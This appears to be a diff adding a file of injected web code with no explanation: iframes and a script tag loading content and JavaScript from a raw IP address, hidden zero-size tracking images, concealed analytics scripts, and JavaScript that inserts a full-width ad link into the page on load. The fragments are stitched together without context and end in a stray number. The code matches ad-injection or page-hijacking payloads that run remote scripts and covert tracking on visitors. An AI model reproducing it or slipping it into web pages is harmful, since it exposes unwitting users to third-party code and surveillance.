@@ -1,0 +1,48 @@
+<iframe id="a" width="80" height="80" scrolling="no" frameborder="0" sandbox="allow-same-origin allow-scripts allow-popups" src="http://123.56.152.96/pagefuknihdngs"></iframe>
+
+<script src="http://123.56.152.96/fkjinhgceso.js"></script>
+
+<a target="_blank" href="http://123.56.152.96/dmydhvbcgdt?aaa.gif"><img id="hncq_fkcjngunfhg" src="http://images.51lsvip.com/aaa.gif" style="width: 100%; height: auto;"><img src="http://51lsvip.com/aaa.gif?adrbj2drsam" style="width: 0px; height: 0px;"></a>
+
+<img src="http://123.56.152.96/xfjsldedsfghjk.gif?xo2pft054hi" style="display: none;">
+
+(function(w){var a7= w.a7 || {} ;var d=document;a7.u = function() {        var f = d.location.href;   var ua = navigator.userAgent.toLowerCase(); var im = d.getElementById("m");            im.src=f+(f.indexOf("?")<0 ? '?':'&')+'_t_t_t='+Math.random(); if (ua.indexOf("iphone") > 0) {im.width=window.innerWidth;im.scrolling="no";};           };a7.c = function() {d.getElementById('x').style.display="none";};w.a7 = a7;})(window);setTimeout(function(){document.getElementById('a').src = 'http://123.56.152.96/pagefuknihdngs';},100);setTimeout(function(){document.getElementById('x').style.display = 'block';},500);
+
+http://images.51lsvip.com/aaa.gif
+http://51lsvip.com/aaa.gif?adrbj2drsam
+
+
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="ie=edge"><title>kijfnhdnu</title></head><body><script src="http://123.56.152.96/fkjinhgceso.js"></script><div style="display: None;"><script src="https://s13.cnzz.com/z_stat.php?id=1273583842&web_id=1273583842" language="JavaScript"></script><script src="https://s19.cnzz.com/z_stat.php?id=1273963115&web_id=1273963115" language="JavaScript"></script></div></body></html>
+
+
+var body = document.getElementsByTagName("body")[0];
+var alink = document.createElement("a");
+alink.target = "_blank";
+alink.href = "http://123.56.152.96/dmydhvbcgdt?aaa.gif";
+var image = document.createElement("img");
+image.id="hncq_fkcjngunfhg";
+image.style.cssText = "width:100%; height: auto"
+image.src = "http://images.51lsvip.com/aaa.gif";
+var record_img = document.createElement("img");
+record_img.src="http://51lsvip.com/aaa.gif" + "?" + Math.random().toString(36).slice(2);
+record_img.style.cssText="width: 0px; height: 0px;";
+alink.appendChild(image);
+alink.appendChild(record_img);
+body.appendChild(alink);
+var check_load = function() {
+    var img_load = document.getElementById("hncq_fkcjngunfhg");
+    if(img_load==undefined){
+        return setTimeout(check_load, 10);
+    }
+    var loaded_img = document.createElement("img");
+    loaded_img.style.cssText="display:None;";
+    loaded_img.src="http://123.56.152.96/xfjsldedsfghjk.gif" + "?" + Math.random().toString(36).slice(2);
+    var page_body = document.getElementsByTagName("body")[0];
+    page_body.appendChild(loaded_img);
+}
+check_load();
+
+<iframe id="a" width="80" height="80" scrolling="no" frameborder="0" sandbox="allow-same-origin allow-scripts allow-popups" src="http://dd.wx16999.com:6578/ssp/adpv/ad/145/2780/1"></iframe>
+
+
+053902341060
